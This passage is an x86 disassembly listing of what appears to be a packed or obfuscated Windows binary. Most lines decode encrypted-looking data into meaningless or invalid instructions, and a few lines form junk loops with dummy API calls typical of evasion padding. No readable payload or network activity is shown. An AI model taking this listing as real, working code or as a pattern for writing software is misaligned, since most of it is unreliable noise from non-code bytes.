  40187a:	mov    esi,0xb3ef47e2
  40187f:	push   esi
  401880:	dec    edi
  401881:	pop    edx
  401882:	push   esp
  401883:	test   ch,dh
  401885:	or     DWORD PTR [ebp-0x6b64777d],esi
  40188b:	push   esp
  40188c:	loope  0x4018b0
  40188e:	jmp    0xa782:0x7477ca17
  401895:	mov    bh,dh
  401897:	add    BYTE PTR [edi+0x2d],ah
  40189a:	add    esi,edi
  40189c:	aam    0x6e
  40189e:	lahf   
  40189f:	xchg   edi,eax
  4018a0:	out    0x7c,al
  4018a2:	add    ah,BYTE PTR [ecx+0x6]
  4018a5:	ss push esp
  4018a7:	stos   BYTE PTR es:[edi],al
  4018a8:	inc    esi
  4018a9:	dec    ecx
  4018aa:	arpl   WORD PTR [ebp+ebp*4+0x4121af3e],si
  4018b1:	test   eax,0x4af0e20d
  4018b6:	cmp    al,0x6b
  4018b8:	mov    DWORD PTR [eax+ecx*8-0x7c],ebx
  4018bc:	cmova  esi,DWORD PTR [esi]
  4018bf:	fimul  DWORD PTR [ecx-0x15]
  4018c2:	mov    ds:0x1ddfe208,eax
  4018c7:	push   ebp
  4018c8:	call   0x3ae103e5
  4018cd:	cmc    
  4018ce:	xchg   esp,eax
  4018cf:	adc    dh,cl
  4018d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018d2:	das    
  4018d3:	mov    ds:0xd66117f9,eax
  4018d8:	stos   DWORD PTR es:[edi],eax
  4018d9:	sub    eax,0x40383bb9
  4018de:	cli    
  4018df:	clc    
  4018e0:	clc    
  4018e1:	icebp  
  4018e2:	xor    dl,bl
  4018e4:	retf   0xa74f
  4018e7:	xor    DWORD PTR [edx],esi
  4018e9:	shl    BYTE PTR ds:0xfb868301,1
  4018ef:	mov    ebp,DWORD PTR [edx+0x35]
  4018f2:	rol    BYTE PTR ds:0x753b07ab,cl
  4018f8:	xor    esi,DWORD PTR [ebp+0x4105f602]
  4018fe:	ret    0x96f6
  401901:	outs   dx,DWORD PTR ds:[esi]
  401902:	cmp    bl,dl
  401904:	(bad)  
  401905:	icebp  
  401906:	jae    0x4018b2
  401908:	push   es
  401909:	fmul   st(5),st
  40190b:	aas    
  40190c:	mov    BYTE PTR [eax+eiz*1],bh
  40190f:	call   0x4e069982
  401914:	(bad)  
  401915:	mov    WORD PTR cs:[edx+0x38],?
  401919:	pop    ss
  40191a:	or     al,0x4e
  40191c:	mov    ch,0x98
  40191e:	dec    ecx
  40191f:	pushf  
  401920:	mov    ds:0x748f287b,al
  401925:	xchg   edi,eax
  401926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401927:	mov    al,0xee
  401929:	out    0xc7,eax
  40192b:	cdq    
  40192c:	dec    ecx
  40192d:	lods   al,BYTE PTR ds:[esi]
  40192e:	rcl    cl,0xca
  401931:	imul   esi,edi,0xffffff84
  401934:	pop    ecx
  401935:	xchg   edx,eax
  401936:	(bad)  
  401937:	adc    al,0xf6
  401939:	shl    BYTE PTR [ebx+0x34],cl
  40193c:	test   DWORD PTR [ebp+0x131a0348],0x636a08fd
  401946:	retf   0x95a0
  401949:	xor    BYTE PTR [esi+0x72a98a9],dl
  40194f:	xchg   esp,eax
  401950:	imul   ebp,DWORD PTR [edx],0x3
  401953:	add    ebx,edi
  401955:	retf   
  401956:	idiv   BYTE PTR [eax+0x487868ab]
  40195c:	push   edx
  40195d:	fs xor dh,al
  401960:	test   BYTE PTR [edi+0x67a05669],al
  401966:	pushf  
  401967:	stos   DWORD PTR es:[edi],eax
  401968:	pop    esp
  401969:	or     al,0x6d
  40196b:	pop    esi
  40196c:	(bad)  
  40196d:	ror    DWORD PTR ds:0x99f20474,cl
  401973:	pop    ebx
  401974:	out    0xb9,eax
  401976:	or     BYTE PTR [esi+0x12],dh
  401979:	nop
  40197a:	iret   
  40197b:	adc    BYTE PTR [edi],0x6d
  40197e:	xchg   edi,eax
  40197f:	sbb    cl,BYTE PTR [edi+0xd]
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	push   esi
  4019a4:	xchg   edi,eax
  4019a5:	rol    BYTE PTR [ebx],cl
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019f0
  4019b0:	arpl   WORD PTR [edx+0xf760645],si
  4019b6:	cmp    al,0x2a
  4019b8:	popf   
  4019b9:	pop    ss
  4019ba:	or     eax,0x36d9da9
  4019bf:	mov    ds:0xb3fd9087,eax
  4019c4:	add    al,0xc6
  4019c6:	sbb    eax,0x75128e62
  4019cb:	cs mov cl,0xf6
  4019ce:	mov    al,0xbb
  4019d0:	adc    ch,ch
  4019d2:	call   DWORD PTR ss:[edx]
  4019d5:	jb     0x401982
  4019d7:	shl    DWORD PTR [esi-0x2fdda06a],cl
  4019dd:	xchg   edx,eax
  4019de:	push   ecx
  4019df:	jmp    0xa53eba1d
  4019e4:	sbb    eax,0xbd162b05
  4019e9:	sar    DWORD PTR [ecx+0x407a4e56],cl
  4019ef:	jg     0x4019f0
  4019f1:	retf   0xbbee
  4019f4:	jno    0x4019bc
  4019f6:	inc    ecx
  4019f7:	in     al,0xe8
  4019f9:	cmc    
  4019fa:	xor    eax,0x59697ac0
  4019ff:	pop    edi
  401a00:	out    dx,al
  401a01:	push   ecx
  401a02:	pusha  
  401a03:	inc    ebx
  401a04:	outs   dx,BYTE PTR ds:[esi]
  401a05:	dec    ebp
  401a06:	jmp    0x81f:0x2148e396
  401a0d:	out    dx,eax
  401a0e:	imul   DWORD PTR [edi-0x6b1cf1b9]
  401a14:	pushf  
  401a15:	(bad)  
  401a16:	in     al,dx
  401a17:	gs stos DWORD PTR es:[edi],eax
  401a19:	paddd  mm0,QWORD PTR [ebx]
  401a1c:	xchg   esp,eax
  401a1d:	and    DWORD PTR [ebx-0x6b],ecx
  401a20:	ja     0x401aa1
  401a22:	sti    
  401a23:	out    dx,al
  401a24:	test   al,0xd0
  401a26:	(bad)  
  401a27:	enter  0xd7f6,0xb2
  401a2b:	adc    edx,edi
  401a2d:	dec    edi
  401a2e:	mov    al,ds:0xeb6cbdd0
  401a33:	shr    DWORD PTR [ecx],0xf4
  401a36:	(bad)  
  401a37:	dec    ebp
  401a38:	mov    bl,0xc6
  401a3a:	lds    esp,FWORD PTR [ebp-0x59901ad6]
  401a40:	(bad)  
  401a41:	in     eax,dx
  401a42:	add    BYTE PTR [edi-0x1237959d],al
  401a48:	call   0x770f1231
  401a4d:	inc    eax
  401a4e:	es rol ecx,cl
  401a51:	inc    esp
  401a52:	and    DWORD PTR [edx+0x40e2a961],edx
  401a58:	icebp  
  401a59:	sub    eax,0x9795abae
  401a5e:	push   cs
  401a5f:	inc    ebp
  401a60:	cmp    eax,0xbf5a4e1a
  401a65:	jmp    DWORD PTR ds:0xa0e0d54
  401a6b:	push   ebp
  401a6c:	inc    eax
  401a6d:	mov    WORD PTR [edi],ds
  401a6f:	js     0x401a8a
  401a71:	loop   0x401a83
  401a73:	mov    dh,0xb6
  401a75:	jns    0x401a8b
  401a77:	repnz cmp bh,BYTE PTR ds:0x6b850188
  401a7e:	dec    eax
  401a7f:	sbb    al,0x7c
  401a81:	shr    BYTE PTR [ebx],0xd2
  401a84:	rol    DWORD PTR [ecx+0x69],1
  401a87:	pusha  
  401a88:	dec    edi
  401a89:	sub    ebx,DWORD PTR [edx-0xe]
  401a8c:	(bad)  
  401a8d:	loopne 0x401b03
  401a8f:	dec    edx
  401a90:	pop    ebp
  401a91:	adc    al,cl
  401a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a94:	dec    edx
  401a96:	mov    al,ds:0xf04cc409
  401a9b:	mov    al,0x61
  401a9d:	add    BYTE PTR [ecx+ecx*1+0x73],al
  401aa1:	xchg   ebx,eax
  401aa2:	xor    eax,0x19d26b2f
  401aa7:	aaa    
  401aa8:	inc    sp
  401aaa:	sbb    BYTE PTR [eax],cl
  401aac:	loopne 0x401a9e
  401aae:	mov    ebp,0x5e3e43b8
  401ab3:	ins    DWORD PTR es:[edi],dx
  401ab4:	dec    ebx
  401ab5:	stos   DWORD PTR es:[edi],eax
  401ab6:	int    0xa8
  401ab8:	push   esp
  401ab9:	je     0x401a9d
  401abb:	sub    eax,0x8e27b038
  401ac0:	pop    edi
  401ac1:	out    0x93,eax
  401ac3:	(bad)  
  401ac4:	pop    eax
  401ac5:	mov    eax,0x4565b39c
  401aca:	outs   dx,BYTE PTR ds:[esi]
  401acb:	xchg   ecx,eax
  401acc:	out    0x5c,eax
  401ace:	call   0x3177be54
  401ad3:	lahf   
  401ad4:	jp     0x401b4e
  401ad6:	mov    esi,0x98086248
  401adb:	inc    edx
  401adc:	xor    eax,esp
  401ade:	jns    0x401ae4
  401ae0:	cmp    cl,BYTE PTR [ebx]
  401ae2:	push   ebx
  401ae3:	sub    esi,0xffffffbc
  401ae6:	jecxz  0x401ad5
  401ae8:	xchg   ebp,eax
  401ae9:	mov    eax,ds:0x52cfd5b1
  401aee:	imul   esi,DWORD PTR [esi+esi*1+0x3],0x1a
  401af3:	pusha  
  401af4:	clc    
  401af5:	fnsave [ebp-0x7446ee25]
  401afb:	mov    cl,BYTE PTR [eax+0x8]
  401afe:	sbb    eax,0xe6af7103
  401b03:	outs   dx,DWORD PTR ds:[esi]
  401b04:	rol    esi,0xfb
  401b07:	outs   dx,BYTE PTR ds:[esi]
  401b08:	stc    
  401b09:	or     al,0x48
  401b0b:	rol    esi,1
  401b0d:	or     eax,DWORD PTR [edx]
  401b0f:	outs   dx,DWORD PTR ds:[esi]
  401b10:	dec    ebp
  401b11:	pusha  
  401b12:	push   es
  401b13:	out    0x58,eax
  401b15:	mov    ds:0xd02e6153,eax
  401b1a:	mov    esp,0x419b55cf
  401b1f:	iret   
  401b20:	dec    ebx
  401b21:	mov    DWORD PTR [ecx-0x2a],ecx
  401b24:	repnz lods eax,DWORD PTR ds:[esi]
  401b26:	fisubr DWORD PTR [esi+0x46]
  401b29:	cmp    al,0x8a
  401b2b:	lahf   
  401b2c:	jo     0x401b61
  401b2e:	mul    eax
  401b30:	jl     0x401ac4
  401b32:	add    eax,0x29d1a145
  401b37:	xor    eax,0x34ec0fe0
  401b3c:	cmp    eax,DWORD PTR [eax-0x5da91fdc]
  401b42:	ror    al,cl
  401b44:	push   esi
  401b45:	xchg   ecx,eax
  401b46:	push   0x390e1ffa
  401b4b:	xchg   esp,eax
  401b4c:	loop   0x401b9c
  401b4e:	jbe    0x401af7
  401b50:	test   DWORD PTR [ecx-0x5f],edi
  401b53:	addr16 add al,0xfe
  401b56:	enter  0x892c,0x63
  401b5a:	inc    edx
  401b5b:	mov    eax,0xf12525b0
  401b60:	xchg   edx,eax
  401b61:	xor    BYTE PTR [esi+0x3c],cl
  401b64:	in     al,dx
  401b65:	repz in al,dx
  401b67:	nop
  401b68:	rcr    DWORD PTR [edi-0x35],0xfe
  401b6c:	mov    bl,0x38
  401b6e:	adc    BYTE PTR [ecx+esi*8],ah
  401b71:	pop    esp
  401b72:	out    dx,al
  401b73:	imul   ecx,DWORD PTR [esi+eax*2+0x5ada35ef],0xa3a2ac4d
  401b7e:	(bad)  
  401b7f:	ficom  WORD PTR [ecx-0x59cfcbed]
  401b85:	pop    esi
  401b86:	cmp    BYTE PTR [ecx],0x89
  401b89:	xor    BYTE PTR [ebx+0x24b8d6cc],dl
  401b8f:	popa   
  401b90:	xchg   ecx,eax
  401b91:	int3   
  401b92:	test   DWORD PTR [edx],ebx
  401b94:	lods   eax,DWORD PTR ds:[esi]
  401b95:	sbb    dh,BYTE PTR ds:0x63cde8b9
  401b9b:	or     ecx,DWORD PTR [ebx]
  401b9d:	push   ds
  401b9e:	rcl    DWORD PTR [eax-0x3e],0x63
  401ba2:	cmp    al,0x61
  401ba4:	enter  0x31e9,0x36
  401ba8:	bound  ebx,QWORD PTR [edx+eax*8]
  401bab:	aad    0x4b
  401bad:	jbe    0x401bba
  401baf:	or     al,BYTE PTR [esi+0xc1a295d]
  401bb5:	and    al,0xba
  401bb7:	adc    DWORD PTR [ebp+eiz*2+0x260f7020],ecx
  401bbe:	inc    esi
  401bbf:	bound  esi,QWORD PTR [ebp-0x55]
  401bc2:	mov    DWORD PTR [ebx+edi*1],eax
  401bc5:	inc    edx
  401bc6:	or     edi,DWORD PTR ds:0x158015d2
  401bcc:	sub    al,0xa6
  401bce:	imul   esp,DWORD PTR [edx],0xffffffa1
  401bd1:	sub    al,BYTE PTR [ebx+0x26dceaec]
  401bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bd8:	imul   ebp,ebx,0xffffff83
  401bdb:	inc    ebx
  401bdc:	mov    ecx,?
  401bde:	repz or ah,BYTE PTR es:[ebp-0xb]
  401be3:	loop   0x401bbd
  401be5:	imul   edi,DWORD PTR [ebp+0x176a146c],0x5adc0fe3
  401bef:	and    cl,BYTE PTR [eax+0x4c013ee]
  401bf5:	adc    ah,BYTE PTR [eax+0x4e0e5e27]
  401bfb:	sar    BYTE PTR [esi-0x75ff8303],1
  401c01:	jmp    0x9281:0x4d0cc25a
  401c08:	mov    ah,BYTE PTR [ecx]
  401c0a:	mov    dh,0xd8
  401c0c:	mov    esi,0x4fa97cef
  401c11:	mov    ecx,0x3c7304e0
  401c16:	adc    eax,0x9df415fd
  401c1b:	xlat   BYTE PTR ds:[ebx]
  401c1c:	or     al,0xe2
  401c1e:	push   edx
  401c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c20:	and    BYTE PTR [ebx-0x2e7d9ff1],cl
  401c26:	clc    
  401c27:	fwait
  401c28:	or     DWORD PTR [eax+0x4c],ebp
  401c2b:	fdivr  DWORD PTR [ebx-0x23]
  401c2e:	adc    BYTE PTR [ecx],bh
  401c30:	out    dx,al
  401c31:	mov    DWORD PTR [ebp-0x20],eax
  401c34:	and    DWORD PTR ds:0x42a85d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a85d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a85d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a85d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a85d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa4e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a85d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a85d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a85d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a781,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a795
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a789
  401cbe:	and    eax,DWORD PTR ds:0x42a7d9
  401cc4:	mov    ds:0x42a789,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a819,0x42a821
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a79d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0x21ba
  401d05:	pop    ebp
  401d06:	loope  0x401cb0
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d76
  401d11:	push   ecx
  401d12:	jo     0x401c9c
  401d14:	mov    cl,0xcc
  401d16:	pusha  
  401d17:	rcl    DWORD PTR [esi+0x74],0x5b
  401d1b:	fsubp  st(6),st
  401d1d:	sbb    eax,0x2cdc6b93
  401d22:	rcl    BYTE PTR [eax-0x45d88997],1
  401d28:	cmp    cl,dl
  401d2a:	sub    DWORD PTR [edi+0x425e4fd],edx
  401d30:	ss push ebp
  401d32:	adc    al,0xfe
  401d34:	stc    
  401d35:	inc    ecx
  401d36:	pop    esi
  401d37:	pop    edi
  401d38:	aam    0x80
  401d3a:	cmp    esp,DWORD PTR [ebx-0xfe0c877]
  401d40:	push   ds
  401d41:	xor    bl,BYTE PTR [eax]
  401d43:	sbb    ah,BYTE PTR ds:[edi+0x7528bbbb]
  401d4a:	cwde   
  401d4b:	and    BYTE PTR [esi],bh
  401d4d:	movzx  eax,WORD PTR [esi+0x3eb73d26]
  401d54:	lock lea ebp,[eax+0x27]
  401d58:	pushf  
  401d59:	scas   al,BYTE PTR es:[edi]
  401d5a:	adc    DWORD PTR [eax+0x37],0x75
  401d5e:	(bad)  
  401d5f:	js     0x401ceb
  401d61:	pop    ds
  401d62:	inc    edi
  401d63:	push   eax
  401d64:	xlat   BYTE PTR ds:[ebx]
  401d65:	push   esp
  401d66:	push   ss
  401d67:	inc    ebx
  401d68:	aad    0x65
  401d6a:	fmul   DWORD PTR [ecx+0x70dca1bf]
  401d70:	sub    eax,0x51d20a28
  401d75:	mov    WORD PTR [ebx],ds
  401d77:	ds inc esi
  401d79:	and    cl,dh
  401d7b:	inc    eax
  401d7c:	in     eax,dx
  401d7d:	(bad)  [eax+0x32]
  401d80:	retf   
  401d81:	push   esi
  401d82:	jl     0x401db6
  401d84:	es xchg ecx,eax
  401d86:	aaa    
  401d87:	ret    
  401d88:	or     esi,0x37
  401d8b:	xchg   ecx,eax
  401d8c:	sbb    al,0x54
  401d8e:	std    
  401d8f:	retf   0x7aec
  401d92:	xchg   edx,eax
  401d93:	arpl   WORD PTR [ebx+esi*4+0x66],ax
  401d97:	jne    0x401da6
  401d99:	or     ecx,DWORD PTR [ebx+0x25]
  401d9c:	dec    edx
  401d9d:	ins    BYTE PTR es:[edi],dx
  401d9e:	int    0x24
  401da0:	lahf   
  401da1:	xor    eax,0x272f94cb
  401da6:	mov    ecx,0x93398828
  401dab:	push   ss
  401dac:	lds    esp,FWORD PTR [esi]
  401dae:	icebp  
  401daf:	cmp    edx,DWORD PTR [ebx+0x5a]
  401db2:	sub    edi,esp
  401db4:	inc    ebx
  401db5:	add    DWORD PTR ds:0xb54427e6,0xdcd807d3
  401dbf:	mov    esp,DWORD PTR [ecx+0x19]
  401dc2:	or     eax,0x24eb81c6
  401dc7:	jb     0x401dd5
  401dc9:	pop    ecx
  401dca:	js     0x401e46
  401dcc:	imul   edx,DWORD PTR [eax-0xd],0x3da4e8c5
  401dd3:	add    ecx,DWORD PTR [ecx-0x7d]
  401dd6:	sahf   
  401dd7:	out    dx,al
  401dd8:	hlt    
  401dd9:	xor    BYTE PTR [ebx+0x17],0x61
  401ddd:	xor    dh,ah
  401ddf:	cmp    bh,BYTE PTR [edi+eiz*1+0x34deeb19]
  401de6:	inc    ecx
  401de7:	int    0x6b
  401de9:	cdq    
  401dea:	shr    BYTE PTR [esi+edi*4+0x5f1f66fe],cl
  401df1:	dec    eax
  401df2:	imul   ebp,DWORD PTR ds:0x252ba7ae,0xc590ed18
  401dfc:	inc    ebx
  401dfd:	loopne 0x401dc4
  401dff:	dec    ebp
  401e00:	aas    
  401e01:	jae    0x401d88
  401e03:	cmp    cl,dl
  401e05:	mov    eax,0x2e69cc03
  401e0a:	mov    fs,esi
  401e0c:	mov    ch,0x35
  401e0e:	outs   dx,BYTE PTR ds:[si]
  401e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e11:	fwait
  401e12:	cmc    
  401e13:	jae    0x401dd0
  401e15:	call   0x8c6e:0xb605d00b
  401e1c:	xchg   DWORD PTR [ecx+0x220b5ae2],ebp
  401e22:	rcl    BYTE PTR [eax-0x35af131f],1
  401e28:	adc    BYTE PTR ds:[esi],0x61
  401e2c:	inc    edi
  401e2d:	pop    ds
  401e2e:	dec    ebp
  401e2f:	fs in  eax,0x21
  401e32:	in     al,0xe7
  401e34:	dec    esi
  401e35:	cmp    eax,0xb0f861b8
  401e3a:	int    0xb6
  401e3c:	(bad)  
  401e3d:	xchg   esi,eax
  401e3e:	or     eax,edx
  401e40:	mov    al,ds:0x4d28a451
  401e45:	adc    al,0x89
  401e47:	enter  0xfd6e,0x44
  401e4b:	or     eax,0xa80fe19c
  401e50:	div    BYTE PTR [ecx-0x4d3e4253]
  401e56:	lods   eax,DWORD PTR ds:[esi]
  401e57:	fnstsw WORD PTR [ecx]
  401e59:	sbb    al,BYTE PTR [edx+0x6a66becd]
  401e5f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  401e61:	mov    eax,0xddfaf0cb
  401e66:	das    
  401e67:	mov    eax,0xca7b16d6
  401e6c:	repz dec edx
  401e6e:	cmc    
  401e6f:	jae    0xd87b7b2c
  401e75:	mov    bl,BYTE PTR [ebx]
  401e77:	in     eax,dx
  401e78:	inc    esi
  401e79:	adc    eax,0x89a5a61d
  401e7e:	imul   edi,ebp,0xffffff95
  401e81:	call   FWORD PTR [eax+0x6a]
  401e84:	jmp    0x401e8d
  401e86:	test   al,0x36
  401e88:	data16 adc al,0x84
  401e8b:	sahf   
  401e8c:	fcmovnu st,st(2)
  401e8e:	leave  
  401e8f:	mov    esi,0x6b94c7ef
  401e94:	cmc    
  401e95:	imul   eax,DWORD PTR [ecx-0x3b155b5d],0x275f4553
  401e9f:	xchg   ecx,eax
  401ea0:	adc    DWORD PTR [eax],0xefd894f9
  401ea6:	test   DWORD PTR [esi],0x9f6fdf05
  401eac:	(bad)  
  401eae:	push   ebp
  401eaf:	mov    edi,0xdd17fb6f
  401eb4:	idiv   edi
  401eb6:	ja     0x401f30
  401eb8:	fstp   TBYTE PTR [ebx-0x16]
  401ebb:	mov    BYTE PTR [edi+0x4e],0xdb
  401ebf:	rcl    DWORD PTR [edi+0x21],0xa5
  401ec3:	enter  0x1bf2,0x1b
  401ec7:	mov    WORD PTR [ecx],es
  401ec9:	push   0x4915b11
  401ece:	jmp    0x779d:0x3aa6a7eb
  401ed5:	imul   ebx,edx,0x25
  401ed8:	cmc    
  401ed9:	out    dx,eax
  401eda:	xchg   bh,al
  401edc:	loop   0x401e7a
  401ede:	jns    0x401f09
  401ee0:	int3   
  401ee1:	mov    eax,ds:0xdca79d0a
  401ee6:	dec    esi
  401ee7:	adc    DWORD PTR [esi+ebp*8-0x40],0xffffff89
  401eec:	push   ss
  401eed:	adc    DWORD PTR ds:0x777b8667,eax
  401ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ef4:	xor    edx,esi
  401ef6:	sub    dl,BYTE PTR [ebx+eax*1-0xa]
  401efa:	repz dec ebx
  401efc:	xchg   BYTE PTR [edx+0x5c4e1632],cl
  401f02:	inc    ebp
  401f03:	test   esp,0xf6d4845a
  401f09:	push   cs
  401f0a:	xchg   esp,eax
  401f0b:	mov    dl,0xb
  401f0d:	sub    eax,0x8e3809dd
  401f12:	mov    esp,0xc432b217
  401f17:	retf   
  401f18:	shl    DWORD PTR [ecx],1
  401f1a:	pushf  
  401f1b:	das    
  401f1c:	inc    ecx
  401f1d:	sbb    bl,BYTE PTR [ebx+0x4ad6c49f]
  401f23:	and    BYTE PTR [eax+edi*8+0x253645f8],ah
  401f2a:	cmc    
  401f2b:	ja     0x401f14
  401f2d:	jb     0x401f14
  401f2f:	(bad)  
  401f30:	jno    0x401f9c
  401f32:	jp     0x401f10
  401f34:	adc    cl,BYTE PTR [edi-0x22407e5f]
  401f3a:	cmp    esi,DWORD PTR [edi]
  401f3c:	sbb    al,0x36
  401f3e:	sub    al,0xeb
  401f40:	mov    esi,0xc02e5b5f
  401f45:	mov    eax,0xda84ec32
  401f4a:	dec    edi
  401f4b:	cmp    eax,ecx
  401f4d:	lea    esp,[edx+0x60c14bc9]
  401f53:	mov    BYTE PTR [eax],ah
  401f55:	inc    ecx
  401f56:	(bad)  
  401f57:	adc    DWORD PTR [ebp-0x7a],ebp
  401f5a:	adc    al,0x95
  401f5c:	push   cs
  401f5d:	add    dl,dh
  401f5f:	add    dl,ah
  401f61:	inc    ecx
  401f62:	sahf   
  401f63:	pop    esi
  401f64:	xor    al,0xa7
  401f66:	mov    bh,0x9f
  401f68:	frstor [esi-0x76]
  401f6b:	mov    BYTE PTR [edi-0x386b2d72],0x19
  401f72:	call   0x2a6a:0xed5780fe
  401f79:	fsubr  st,st(6)
  401f7b:	mov    esi,0x71b6da7f
  401f80:	cmp    al,0xd5
  401f82:	lahf   
  401f83:	adc    al,0x3c
  401f85:	and    ah,BYTE PTR [esi+eax*4+0x41]
  401f89:	rcl    bh,0xb7
  401f8c:	sbb    al,0x62
  401f8e:	mov    al,al
  401f90:	ja     0x401fad
  401f92:	add    ecx,DWORD PTR [eax]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a859
  401f9c:	and    eax,DWORD PTR ds:0x42a8a9
  401fa2:	mov    ds:0x42a859,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a811,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a779,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a779
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a779,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a779,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a779,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [edi-0x43],edi
  402019:	rcr    esp,1
  40201b:	xchg   BYTE PTR [eax+edi*2],al
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x401fd3
  402024:	adc    eax,0xfdac7fcc
  402029:	loop   0x401fec
  40202b:	pop    ebx
  40202c:	mov    bh,0xb1
  40202e:	xchg   ecx,eax
  40202f:	xor    eax,0x7750ff09
  402034:	push   0xcbe7afe1
  402039:	test   edi,0x26175e9d
  40203f:	shl    DWORD PTR [edi+edi*2],1
  402042:	cmp    BYTE PTR [esi-0x618b58c6],al
  402048:	mov    DWORD PTR [eax],0xbe550b65
  40204e:	cmp    ah,BYTE PTR [ebp-0x53]
  402051:	xor    al,BYTE PTR [ebx]
  402053:	jp     0x402065
  402055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402056:	sar    DWORD PTR [edi],0x65
  402059:	dec    esp
  40205a:	ja     0x4020c2
  40205c:	loope  0x4020db
  40205e:	addr16 shr ecx,0x1c
  402062:	mov    ds:0xf44d94d7,al
  402067:	mov    dh,0x93
  402069:	ins    BYTE PTR es:[edi],dx
  40206a:	jge    0x401ff6
  40206c:	inc    edx
  40206d:	sahf   
  40206e:	mov    esp,0xe09c8dbc
  402073:	jbe    0x402063
  402075:	dec    esp
  402076:	stc    
  402077:	fisub  DWORD PTR [ebx+edx*1]
  40207a:	ins    BYTE PTR es:[edi],dx
  40207b:	pop    edx
  40207c:	and    eax,DWORD PTR [ecx]
  40207e:	adc    DWORD PTR [esp+ebx*1-0x59f1b3dc],ecx
  402085:	adc    DWORD PTR [esi],0x787a1891
  40208b:	lock pop ebx
  40208d:	xchg   ebp,eax
  40208e:	push   eax
  40208f:	pop    ebx
  402090:	test   DWORD PTR [edi+0x6a],edx
  402093:	xchg   esp,eax
  402094:	xchg   edx,eax
  402095:	dec    eax
  402096:	fwait
  402097:	mov    DWORD PTR [edi],0xb468f1c6
  40209d:	addr16 enter 0xc12b,0xbe
  4020a2:	xchg   edx,eax
  4020a3:	mov    ds:0xf02c3c9d,al
  4020a8:	rcr    BYTE PTR [edi-0x4dfed9de],cl
  4020ae:	pop    es
  4020af:	les    edx,FWORD PTR [edi+ebp*1+0x1f7e0e17]
  4020b6:	xor    BYTE PTR [esi],dh
  4020b8:	lods   al,BYTE PTR ds:[esi]
  4020b9:	mov    ebx,0xdbb96799
  4020be:	pop    es
  4020bf:	das    
  4020c0:	leave  
  4020c1:	xlat   BYTE PTR ds:[ebx]
  4020c2:	ins    DWORD PTR es:[edi],dx
  4020c3:	retf   0xfc9d
  4020c6:	push   edx
  4020c7:	loop   0x402069
  4020c9:	and    ebx,DWORD PTR [eax-0x704e0b71]
  4020cf:	or     DWORD PTR [esp+ebp*1-0x15],eax
  4020d3:	scas   eax,DWORD PTR es:[edi]
  4020d4:	std    
  4020d5:	add    al,0x7d
